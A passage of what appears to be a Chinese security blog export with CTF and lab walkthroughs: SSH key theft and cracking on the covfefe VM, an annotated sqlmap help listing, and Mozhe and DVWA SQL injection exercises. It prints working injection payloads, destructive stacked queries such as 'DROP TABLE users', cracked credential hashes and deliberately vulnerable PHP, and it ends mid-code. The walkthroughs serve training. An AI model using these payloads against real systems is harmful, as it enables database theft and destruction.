    <content type="text"><![CDATA[Background SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。 靶场环境靶机convfefe ：192.168.0.109攻击机Kali ： 192.168.0.104 信息探测先进行ip的探测 1root@kali:~# netdiscover -r 192.168.0.0/24 服务探测知道了IP，探测一下靶机目标开放了那些服务 1root@kali:~# nmap -sV 192.168.0.109 发现开放了2个http服务和一个ssh服务；http服务可以通过网页的形式访问 访问页面，没有发现可用信息；有时候可以通过网页源代码发现一点可用的信息，但是这里没有发现可用信息 http隐藏文件探测网页源代码没有发现可用的信息，这里我们可用使用工具探测一下该服务隐藏文件 1root@kali:~# dirb http://192.168.0.109:31337/ 发现了一些敏感文件(robots.txt，.ssh) 右键打开链接robots协议不允许访问这些文件目录那我们就尝试访问一下 发现了第一个flag：flag1{make_america_great_again} 同样我们可以打开.ssh文件发现了ssh的公钥、私钥 （SSH下autho…） 将其文件下载至本地（如访问.ssh/id_rsa的形式进行下载）id_rsa是私钥，authorized_keys是认证关键字（包含公钥），公钥可不用下载 下载下来后，我们需要修改私钥的权限，不然无法连接靶机ssh-key 登录 要求私钥文件 属性必须是400 600 不能他人访问权限 1root@kali:~/test# chmod 600 id_rsa ssh连接还需要用户名，这里可以查看authorized_keys文件 ssh连接1root@kali:~/test# ssh -i id_rsa simon@192.168.0.109 // -i 私钥文件 发现还需要一个密码 解密ssh密钥信息用ssh2john 将id_isa密钥信息转换为john可以识别的信息因为我的kali上没有找到该工具，所以在john官方工具里找到它的脚本 1root@kali:~/test# ../tools/ssh2john.py id_rsa &gt; rsacrack 利用字典破解 1root@kali:~/test# zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules rsacrack 破解出来密码是starwars 再次连接 打开root根目录，发现一个flag文件，和一个c语言程序 12simon@covfefe:/root$ lsflag.txt read_message.c 查看flag文件，不过没有权限 12simon@covfefe:/root$ cat flag.txt cat: flag.txt: Permission denied 这里可以用find命令查找具有权限的文件 1234567891011121314simon@covfefe:/root$ find / -perm -4000 2&gt;/dev/null // -perm -4000 具有权限 2&gt;/dev/null 避免错误/usr/bin/chsh/usr/bin/passwd/usr/bin/chfn/usr/bin/gpasswd/usr/bin/newgrp/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/local/bin/read_message/bin/umount/bin/su/bin/mount/bin/ping 查看c语言的代码 12345678910111213141516171819202122232425#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;// You're getting close! Here's another flag:// flag2&#123;use_the_source_luke&#125;int main(int argc, char *argv[]) &#123; char program[] = "/usr/local/sbin/message"; char buf[20]; char authorized[] = "Simon"; printf("What is your name?\n"); gets(buf); // Only compare first five chars to save precious cycles: if (!strncmp(authorized, buf, 5)) &#123; printf("Hello %s! Here is your message:\n\n", buf); // This is safe as the user can't mess with the binary location: execve(program, NULL, NULL); &#125; else &#123; printf("Sorry %s, you're not %s! The Internet Police have been informed of this violation.\n", buf, authorized); exit(EXIT_FAILURE); &#125;&#125; 很幸运，在代码的注释中发现了flag2：flag2{use_the_source_luke} 缓冲区溢出对代码进行审计;程序通过用户输入的值的前5位进行判断如果匹配结果为Simon，则通过函数execve执行program数组中的内容 因为我们输入的值是保存在一个20字节的数组中，可以考虑溢出提权 这里我们获得了root权限，可以查看flag文件 第三个flag：flag3{das_bof_meister}]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLMAP自动注入]]></title>
    <url>%2F2019%2F08%2F02%2FSQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[sqlmap是一款非常强大的开源sql自动化注入工具，可以用来检测和利用sql注入漏洞【动态页面中get/post参数、cookie、HTTP头】。它由Python语言开发而成，因此运行需要安装python环境。但在kali中已经集成。其功能完善，有强大的引擎，适用几乎所有数据库，，可自动进行数据榨取，也可对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行操作系统命令），还可以做XSS漏洞检测。 五种漏洞检测技术 基于布尔的盲注检测 基于时间的盲注检测 ‘ and (select * from (select(sleep(20)))a)– 基于错误的检测 基于UNION联合查询的检测 适用于通过循环直接输出联合查询结果，否则只显示第一项结果 基于堆叠的检测 ；堆叠多个查询语句 适用于非select的数据修改、删除操作 支持的数据库 MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase , SAP MaxDB 其他特性 数据库直接连接 -d 不通过SQL注入，制定身份认证信息、IP、端口 与burpsuite、google结合使用，支持正则表达式限定测试目标 Get、post、cookie、Referer、User-Agent（随机或指定） Cookie过期后自动处理Set-Cookie头，更新cookie信息 限速：最大并发、延迟发送 支持Basic，Digest，NTLM，CA身份认证 数据库版本、用户、权限、hash枚举和字典破解、暴力破解表列名称 文件上传下载、UDF\启动并执行存储过程、操作系统命令执行、访问windows注册表 与W3af、metasploit集成结合使用，基于数据库服务进程提权和上传执行后门 SQLMAP安装更新12345sqlmap --update git clone https://github.com/sqlmapproject/sqlmap.gitgit pull 参数详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269 ___ __H__ ___ ___[&quot;]_____ ___ ___ &#123;1.2.7.28#dev&#125;|_ -| . [(] | .&apos;| . ||___|_ [&quot;]_|_|_|__,| _| |_|V |_| http://sqlmap.orgUsage: sqlmap.py [options]Options: -h, --help Show basic help message and exit -hh Show advanced help message and exit --version Show program&apos;s version number and exit -v VERBOSE Verbosity level: 0-6 (default 1) Target: // 目标 At least one of these options has to be provided to define the target(s) -d DIRECT Connection string for direct database connection // 连接数据库 -u URL, --url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;) // 指定url -l LOGFILE Parse target(s) from Burp or WebScarab proxy log file // 指定相关日志文件 -x SITEMAPURL Parse target(s) from remote sitemap(.xml) file // 指定站点体贴 -m BULKFILE Scan multiple targets given in a textual file // 指定保存多个url的文件 -r REQUESTFILE Load HTTP request from a file // 指定包含http头部的url的文件(可用于post方法) -g GOOGLEDORK Process Google dork results as target URLs -c CONFIGFILE Load options from a configuration INI file // 将命令保存文件，然后指定执行 Request: // 请求 These options can be used to specify how to connect to the target URL --method=METHOD Force usage of given HTTP method (e.g. PUT) --data=DATA Data string to be sent through POST //指定传递参数（POST） --param-del=PARA.. Character used for splitting parameter values //变量分隔符 --cookie=COOKIE HTTP Cookie header value --cookie-del=COO.. Character used for splitting cookie values --load-cookies=L.. File containing cookies in Netscape/wget format --drop-set-cookie Ignore Set-Cookie header from response //忽略网页响应的新cookies --user-agent=AGENT HTTP User-Agent header value --random-agent Use randomly selected HTTP User-Agent header value //随机User-Agent --host=HOST HTTP Host header value //指定host名称 --referer=REFERER HTTP Referer header value //指定referer头 -H HEADER, --hea.. Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;) --headers=HEADERS Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;) //指定请求头部信息（参数用\n分隔） --auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI) //用于HTTP协议认证 --auth-cred=AUTH.. HTTP authentication credentials (name:password) --auth-file=AUTH.. HTTP authentication PEM cert/private key file // 用于客户端认证 --ignore-code=IG.. Ignore HTTP error code (e.g. 401) --ignore-proxy Ignore system default proxy settings --ignore-redirects Ignore redirection attempts --ignore-timeouts Ignore connection timeouts --proxy=PROXY Use a proxy to connect to the target URL // 指定代理服务器 --proxy-cred=PRO.. Proxy authentication credentials (name:password) --proxy-file=PRO.. Load proxy list from a file --tor Use Tor anonymity network --tor-port=TORPORT Set Tor proxy port other than default --tor-type=TORTYPE Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default)) --check-tor Check to see if Tor is used properly --delay=DELAY Delay in seconds between each HTTP request //http(s)请求之间得延迟时间，单位秒 --timeout=TIMEOUT Seconds to wait before timeout connection (default 30) // 超时时间 --retries=RETRIES Retries when the connection timeouts (default 3) // 重试次数 --randomize=RPARAM Randomly change value for given parameter(s) //指定请求需要随机值的参数，如id --safe-url=SAFEURL URL address to visit frequently during testing --safe-post=SAFE.. POST data to send to a safe URL --safe-req=SAFER.. Load safe HTTP request from a file --safe-freq=SAFE.. Test requests between two visits to a given safe URL --skip-urlencode Skip URL encoding of payload data // 跳过url的编码 --csrf-token=CSR.. Parameter used to hold anti-CSRF token --csrf-url=CSRFURL URL address to visit to extract anti-CSRF token --force-ssl Force usage of SSL/HTTPS // 使用https协议 --hpp Use HTTP parameter pollution method // 使用HTTP参数污染方法 ，绕过WAF/IPS/IDS的有效方法 --eval=EVALCODE Evaluate provided Python code before the request (e.g. // 利用代码修改url中的参数值 &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;) Optimization: //优化性能 These options can be used to optimize the performance of sqlmap -o Turn on all optimization switches // 开启以下三个参数，除--threads --predict-output Predict common queries output // 根据返回值和和统计表内容，不断缩小检测范围，提高效率 （与--thread参数不兼容） --keep-alive Use persistent HTTP(s) connections //使用http(s)长连接,减小开销 与--proxy不兼容 --null-connection Retrieve page length without actual HTTP response body //只获取返回页面的大小 ，而非内容常用于盲注，与--text-only不兼容 --threads=THREADS Max number of concurrent HTTP(s) requests (default 1) // 并发线程数 Injection: // 注入 These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts -p TESTPARAMETER Testable parameter(s) // 指定扫描的参数 --skip=SKIP Skip testing for given parameter(s) // 跳过指定参数的扫描 --skip-static Skip testing parameters that not appear to be dynamic --param-exclude=.. Regexp to exclude parameters from testing (e.g. &quot;ses&quot;) --dbms=DBMS Force back-end DBMS to provided value // 指定扫描目标扫描的数据库类型版本 --dbms-cred=DBMS.. DBMS authentication credentials (user:password) // 指定数据库账号密码 --os=OS Force back-end DBMS operating system to provided value //指定扫描目标的操作系统 --invalid-bignum Use big numbers for invalidating values // 使用大的数字使参数失效，如id=99999999 --invalid-logical Use logical operations for invalidating values //使用逻辑操作使参数失效 --invalid-string Use random strings for invalidating values // 使用随机字符串使参数失效 --no-cast Turn off payload casting mechanism // 关闭有效载荷释放机制 // 榨取数据时，sqlmap将所有结果转换为字符串，并用空格代替NULL结果 // 在老版本mysql数据库需要开启此开关 --no-escape Turn off string escaping mechanism // 关闭字符串转义机制 --prefix=PREFIX Injection payload prefix string // 在payload前面加前缀 --suffix=SUFFIX Injection payload suffix string // 在payload前面加后缀 --tamper=TAMPER Use given script(s) for tampering injection data // 使用脚本注入，常用于绕过WAF，IDS Detection: // 检测 These options can be used to customize the detection phase --level=LEVEL Level of tests to perform (1-5, default 1) // 检测级别 （/usr/share/sqlmap/xml/payloads） --risk=RISK Risk of tests to perform (1-3, default 1) // 风险级别 --string=STRING String to match when query is evaluated to True //查询计算为True时要匹配的字符串 --not-string=NOT.. String to match when query is evaluated to False //查询计算为False时要匹配的字符串 --regexp=REGEXP Regexp to match when query is evaluated to True //当查询被评估为True时匹配的正则表达式 --code=CODE HTTP code to match when query is evaluated to True //查询评估为True时要匹配的HTTP代码 --text-only Compare pages based only on the textual content //仅根据文本内容比较页面 --titles Compare pages based only on their titles //仅根据标题比较页面 Techniques: // 技术 These options can be used to tweak testing of specific SQL injection techniques --technique=TECH SQL injection techniques to use (default &quot;BEUSTQ&quot;) //指定扫描的技术（如报错、时间等） --time-sec=TIMESEC Seconds to delay the DBMS response (default 5) //基于时间注入的延时 --union-cols=UCOLS Range of columns to test for UNION query SQL injection //联合查询的列数 --union-char=UCHAR Character to use for bruteforcing number of columns // 指定联合查询时的数值，默认NULL --union-from=UFROM Table to use in FROM part of UNION query SQL injection --dns-domain=DNS.. Domain name used for DNS exfiltration attack --second-url=SEC.. Resulting page URL searched for second-order response // 响应的结果在另一个url页面中 --second-req=SEC.. Load second-order HTTP request from file Fingerprint: -f, --fingerprint Perform an extensive DBMS version fingerprint \\ 查询数据库版本，操作系统，架构等 Enumeration: // 枚举 These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements -a, --all Retrieve everything // 检索一切 -b, --banner Retrieve DBMS banner // 查询数据库的banner信息（数据库版本） --current-user Retrieve DBMS current user //当前数据库用户 --current-db Retrieve DBMS current database // 当前使用的数据库 --hostname Retrieve DBMS server hostname // 查询主机名 --is-dba Detect if the DBMS current user is DBA --users Enumerate DBMS users // 查询数据库用户 --passwords Enumerate DBMS users password hashes --privileges Enumerate DBMS users privileges // 枚举用户的权限信息（-U 指定用户 -CU 当前用户） --roles Enumerate DBMS users roles --dbs Enumerate DBMS databases // 枚举当前所有的数据库 --tables Enumerate DBMS database tables --columns Enumerate DBMS database table columns --schema Enumerate DBMS schema // 枚举元数据库中的信息 --count Retrieve number of entries for table(s) --dump Dump DBMS database table entries // 将枚举的信息存储下来 --dump-all Dump all DBMS databases tables entries --search Search column(s), table(s) and/or database name(s) --comments Check for DBMS comments during enumeration -D DB DBMS database to enumerate -T TBL DBMS database table(s) to enumerate -C COL DBMS database table column(s) to enumerate -X EXCLUDE DBMS database identifier(s) to not enumerate // -U USER DBMS user to enumerate // 指定用户 --exclude-sysdbs Exclude DBMS system databases when enumerating tables --pivot-column=P.. Pivot column name --where=DUMPWHERE Use WHERE condition while table dumping --start=LIMITSTART First dump table entry to retrieve // 通过start和stop参数选择查询的数据量（行数） --stop=LIMITSTOP Last dump table entry to retrieve0 --first=FIRSTCHAR First query output word character to retrieve --last=LASTCHAR Last query output word character to retrieve --sql-query=QUERY SQL statement to be executed --sql-shell Prompt for an interactive SQL shell --sql-file=SQLFILE Execute SQL statements from given file(s) Brute force: // 暴力破解 These options can be used to run brute force checks --common-tables Check existence of common tables // 破解表名称 --common-columns Check existence of common columns // 破解列名称 User-defined function injection: // 用户自定义函数注入 These options can be used to create custom user-defined functions --udf-inject Inject custom user-defined functions --shared-lib=SHLIB Local path of the shared library File system access: These options can be used to access the back-end database management system underlying file system --file-read=RFILE Read a file from the back-end DBMS file system // 读取目标系统文件 --file-write=WFILE Write a local file on the back-end DBMS file system // 写文件 --file-dest=DFILE Back-end DBMS absolute filepath to write to // 上传文件存储的位置（目标地址） Operating system access: // 操作系统访问 These options can be used to access the back-end database management system underlying operating system --os-cmd=OSCMD Execute an operating system command //执行cmd命令 --os-shell Prompt for an interactive operating system shell //提示输入交互式操作系统shell --os-pwn Prompt for an OOB shell, Meterpreter or VNC --os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC --os-bof Stored procedure buffer overflow exploitation --priv-esc Database process user privilege escalation --msf-path=MSFPATH Local path where Metasploit Framework is installed --tmp-path=TMPPATH Remote absolute path of temporary files directory Windows registry access: // windows注册表访问 These options can be used to access the back-end database management system Windows registry --reg-read Read a Windows registry key value --reg-add Write a Windows registry key value data --reg-del Delete a Windows registry key value --reg-key=REGKEY Windows registry key --reg-value=REGVAL Windows registry key value --reg-data=REGDATA Windows registry key value data --reg-type=REGTYPE Windows registry key value type General: These options can be used to set some general working parameters -s SESSIONFILE Load session from a stored (.sqlite) file // 指定会话文件存放位置 -t TRAFFICFILE Log all HTTP traffic into a textual file // 指定流量文件存放位置 --batch Never ask for user input, use the default behavior // 所有提示都用默认选项 --binary-fields=.. Result fields having binary values (e.g. &quot;digest&quot;) --check-internet Check Internet connection before assessing the target --crawl=CRAWLDEPTH Crawl the website starting from the target URL // 爬取信息，指定爬取深度 --crawl-exclude=.. Regexp to exclude pages from crawling (e.g. &quot;logout&quot;) --csv-del=CSVDEL Delimiting character used in CSV output (default &quot;,&quot;) //指定csv文件数据的分隔符 --charset=CHARSET Blind SQL injection charset (e.g. &quot;0123456789abcdef&quot;) // 强制字符编码 --dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE) --encoding=ENCOD.. Character encoding used for data retrieval (e.g. GBK) --eta Display for each output the estimated time of arrival --flush-session Flush session files for current target // 清空会话数据 --forms Parse and test forms on target URL --fresh-queries Ignore query results stored in session file // 忽略session查询结果 --har=HARFILE Log all HTTP traffic into a HAR file --hex Use hex conversion during data retrieval 以16进制进行数据传输 --output-dir=OUT.. Custom output directory path // 指定输出目录 --parse-errors Parse and display DBMS error messages from responses // 分析数据库内建报错信息 --save=SAVECONFIG Save options to a configuration INI file // 编辑配置文件 --scope=SCOPE Regexp to filter targets from provided proxy log //从日志文件通过正则表达式过滤目标 --test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW) --test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK) --update Update sqlmap Miscellaneous: // 杂项 -z MNEMONICS Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;) // 参数助记符 --alert=ALERT Run host OS command(s) when SQL injection is found --answers=ANSWERS Set question answers (e.g. &quot;quit=N,follow=N&quot;) --beep Beep on question and/or when SQL injection is found --cleanup Clean up the DBMS from sqlmap specific UDF and tables --dependencies Check for missing (non-core) sqlmap dependencies --disable-coloring Disable console output coloring --gpage=GOOGLEPAGE Use Google dork results from specified page number --identify-waf Make a thorough testing for a WAF/IPS/IDS protection // waf/ips/ids的彻底检测 --list-tampers Display list of available tamper scripts --mobile Imitate smartphone through HTTP User-Agent header // 模拟成手机发送请求 --offline Work in offline mode (only use session data) --purge Safely remove all content from sqlmap data directory //安全地从sqlmap数据目录中删除所有内容 --skip-waf Skip heuristic detection of WAF/IPS/IDS protection --smart Conduct thorough tests only if positive heuristic(s) // 只选择基于错误的检测结果 --sqlmap-shell Prompt for an interactive sqlmap shell --tmp-dir=TMPDIR Local directory for storing temporary files --web-root=WEBROOT Web server document root directory (e.g. &quot;/var/www&quot;) --wizard Simple wizard interface for beginner users // 注入向导]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[墨者-SQL手工注入漏洞测试(Access数据库)]]></title>
    <url>%2F2019%2F07%2F30%2F%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-Access%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[Background 安全工程师”墨者”最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境IIS+ASP+Access，Aspx代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。 存在漏洞的链接 1http://mozhe.cn/new_list.asp?id=1 注入点检测基于报错的检测1http://mozhe.cn/new_list.asp?id=1&apos; 页面返回不正常，可能存在SQL注入 基于布尔的检测12http://mozhe.cn/new_list.asp?id=1 and 1=1http://mozhe.cn/new_list.asp?id=1 and 1=2 通过页面结果，该链接确实存在SQL注入漏洞 判断selet字段数12http://mozhe.cn/new_list.asp?id=1 order by 4 //显示正常http://mozhe.cn/new_list.asp?id=1 order by 5 //显示不正常 判断出select中有4个字段数 猜解数据库的表名1http:/mozhe.cn/new_list.asp?id=1 union select 1,2,3,4 from table1 可以通过手动或自动化工具更换‘table1’，猜解存在的表名发现admin表 并且发现显示的字段位置在2，3 猜解数据库列名1http://mozhe.cn/new_list.asp?id=1 union select 1,2,3,4 from admin 将任意一个数字更换成列名，如果列名存在，则正常显示有时候，可以直接得到表中的数据 发现username、id、passwd等列字段 爆出账号密码1http://mozhe.cn/new_list.asp?id=1 union select 1,username,passwd,4 from admin 账号：moke密码：7e6ec4fadf84938f 密码是md5加密，通过在线破解后，就可以登陆后台拿到key值]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[墨者-SQL手工注入漏洞测试(MySQL数据库)]]></title>
    <url>%2F2019%2F07%2F29%2F%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[Background 安全工程师”墨者”最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧。 检测SQL注入点发现一个维护公告链接 基于报错的检测先在链接后的id=1加入 ‘，查看页面反应发现页面没有任何显示，可能存在SQL注入 基于布尔值判断12http://mozhe.cn/new_list.php?id=1 and 1=1 正常显示http://mozhe.cn/new_list.php?id=1 and 1=2 不正常显示 那么可以判段存在SQL注入 判断select字段个数12http://mozhe.cn/new_list.php?id=1 order by 4http://mozhe.cn/new_list.php?id=1 order by 5 当order by语句中数值大于4，页面不显示，说明select语句中有4个字段 查询数据库信息先判断页面中会显示的字段位置 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2,3,4 判断出2，3字段的位置会在页面显示，因此可以开始构造sql语句了 查询数据库名，版本 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,database(),version(),4 数据库名：mozhe_Discuz_StormGroup版本： 5.7.22-0ubuntu0.16.04.1 这里也可以用CONCAT_WS函数 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),4 获取数据库名1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,table_schema,4 from information_schema.tables limit 1,1 通过修改limit值获得所有数据库名称获得5个数据库名称information_schema、 mozhe_Discuz_StormGroup、 mysql、 performance_schmozhe.cn 1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,table_name,4 from information_schema.tables where table_schema=&apos;mozhe_Discuz_StormGroup&apos; limit 0,1 mozhe_Discuz_StormGroup库的表名：StormGroup_member、 notice 获取数据库列名1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,2 ,column_name,4 from information_schema.columns where table_schema=&apos;mozhe_Discuz_StormGroup&apos; and table_name=&apos;StormGroup_member&apos; limit 0,1 StormGroup_member表的列名： id、 name、 password、 status 获取字段内容（账号密码）1http://mozhe.cn/new_list.php?id=1 and 1=2 union select 1,name,password,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 0,1 账号密码（MD5在线破解）mozhe 356f589a7df439f6f744ff19bb8092c0 —-dsan13mozhe c0b11cc529cd469efe3c3333e2bcc3db —-346753 登陆后台获取key]]></content>
      <categories>
        <category>靶场实战</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘漏洞-SQL盲注（四）]]></title>
    <url>%2F2019%2F07%2F27%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[SQL盲注 SQL盲注：不显示数据库内建的报错信息【内建的报错信息帮助开发人员发现和修复问题】，但由于报错信息中提供了关于系统的大量有用信息。当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，SQL注入将无法依据报错信息判断注入语句的执行结果，即为盲注。 思路:既然无法基于报错信息判断结果，那就基于逻辑真假的不同结果来判断 SQL注入判断基本的布尔值判断 121&apos; and 1=1 -- // True 有回显 或 显示正常1&apos; and 1=2 -- // False 无回显 或 报错 当布尔值为真，有显示内容，布尔值为假，无回显基于这样判断，很可能存在SQL注入漏洞 推测select字段数121&apos; order by 2 -- // 判断select语句中的列字段个数1&apos; order by 3 -- 当order by 后的num 大于select中的字段数，无回显如上当num值为2时，还有回显，num大于2时，无回显，说明select语句中查询的字段数为2个因此后续就可以利用union select语句查询想要的信息 查询数据库11' union select null, CONCAT_WS(CHAR(32,58,32), user(), database(), version()) -- // 查询mysql用户，数据库名，数据库版本 11' union select null, table_name from information_schema.tables -- // 查询元数据库中的所有表名 11' and 1=0 union select null,table_name from information_schema.columns where table_name='users' # // 查询是否有users这张表 猜解数据库12' or user='admin 12' or user like '%a% 猜账号密码12' or user='admin' and password='5f4dcc3b5aa765d61d8327deb882cf99 【BurpSuite自动化】 另类猜解当遇到网页不显示任何从数据库中提取的信息，只有页面风格画面的转换 12and 1=1 -- 显示 页面1and 1=2 -- 显示 页面2 此时，常见注入工具可能无法发现漏洞可以尝试构造语句，手工注入或编写脚本 11' and ORD(MID((version()),1,1))&amp;128&gt;0 -- 函数： ORD() ：把函数中的字符转换成ASCII码 MID(ColumnName, Start [, Length]) ：截取字符串 ORD(string)&amp;128 ：将转换的ASCII数值于128(二进制：10000000)进行与运算； 如果运算结果大于0，说明第一位数值为1（从左往右） 如果运算结果等于0，说明第一位数值为0 依次计算（1，2，4，8，16，32，64，128）,判断每一位的二进制数值 然后将计算到的二进制值转成十进制，反向计算出ASCII值【注】：键盘可输入的ASCII值只有128位 通过判断有无回显，间接猜出想要的信息以下以判断数据库名为例通过以上的回显进行判断,有回显置1 1231' and ORD(MID((database()),1,1))&amp;128&gt;0 -- 128 64 32 16 8 4 2 1b 0 1 1 0 0 1 0 0 计算出ASCII值为100，即字符 ‘d’后面字符的猜解，只需修改截取的位置 11' and ORD(MID((database()),2,1))&amp;128&gt;0 -- 通过多次猜解，就可以得到数据库名 ‘dvwa’； 12345671' and ORD(MID((database()),n,1))&amp;128&gt;0 -- n 128 64 32 16 8 4 2 1 ascii(DEC)1 0 1 1 0 0 1 0 0 -----100--------d2 0 1 1 1 0 1 1 0 -----118--------v3 0 1 1 1 0 1 1 1 -----100--------w4 0 1 1 0 0 0 0 1 ------97--------a]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web渗透</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手动挖掘漏洞-SQL注入（三）]]></title>
    <url>%2F2019%2F07%2F25%2F%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一般情况下，information_schema表只有root用户，或者被授权的用户才能访问；如果数据库管理员是用普通用户启用mysql服务，可能就无权限访问，不过可以通过注入的sql语句，观察网页回显，猜解数据库、表名、字段。 由上图，我们可以得知mysql的权限为root权限，知道为root权限，就能通过information_schema表获得我们想要的信息 我们也可以通过猜解的方式，获取信息 猜列名1' and column is null -- 替换sql语句中的‘column’，判断网页回显sql语句的意思是 ：并且列有一个字段为空；（如果列名存在，网页不会有回显；列名不存在，网页报错）eg. burpsuite字典猜解选择替换字段的位置字典的选择，可以再kali里搜索，猜解字段的有效程度，取决于字典的质量可以通过以下命令将字典拷贝出来，并且过滤一些#开头的字段 1root@kali:~# cat /usr/share/golismero/tools/sqlmap/txt/common-columns.txt | grep -v ^# &gt; columns.txt 载入字典开始攻击通过返回的长度，判断字段是否存在 猜解表名1' and table.user is null -- user是为确认存在的列字段，目的是判断‘table’这张表中是否存在user字段（如果表名存在，网页不会有回显；表名不存在，网页报错） 查找字典 1root@kali:~# cat /usr/share/golismero/tools/sqlmap/txt/common-tables.txt | grep -v ^# &gt; tables.txt 通过返回的消息长度，判断该表是否存在 猜解其他表名1' and (select count(*) from abc)&gt;0 -- 统计表中记录，若大于0，表名存在，可能直接爆出库名和表名 猜解表列的关系1' and users.user is null -- 判断users表中是否有user列 猜解字段内容 判断user列中是否有admin字段（后面为真，则显示，证明该内容存在） 1' or user='admin 猜解user列中包含a的所有字段（通配符，只要字段中包含a，则显示） 1' or user like '%a% 猜解账号密码1' or user='admin' and password='5f4dcc3b5aa765d61d8327deb882cf99 数据库写入当我们获得足够的数据库权限，可以对数据库写入时，可以增加或修改账号密码，来获得更多的信息 1'; update users set user='new_admin' where user='admin 但是在有些站点无法运行该语句，是sql客户端的问题代码存在问题，导致注入失败【原因】 数据库评估软件hexorBase（用于破解或连接数据库的软件） 插入一条新用户 1'; IINSERT INTO users( user_id, first_name, last_name, user, password, avatar) VALUES(10,'gali','yy', 'galiyy', '5f4dcc3b5aa765d61d8327deb882cf99', 'ok');-- 删除一张表 1'; DROP TABLE users; -- 源码分析Low12345678910111213141516171819202122232425262728&lt;?php if(isset($_GET['Submit']))&#123; // Retrieve data $id = $_GET['id']; $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'"; $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i = 0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,"first_name"); $last = mysql_result($result,$i,"last_name"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125;&#125;?&gt; 获取id值没有进行任何过滤，只需注意引号的闭合即可注入 Medium123456789101112131415161718192021222324252627282930&lt;?phpif (isset($_GET['Submit'])) &#123; // Retrieve data $id = $_GET['id']; $id = mysql_real_escape_string($id); # 对一些字符进行了转义 $getid = "SELECT first_name, last_name FROM users WHERE user_id = 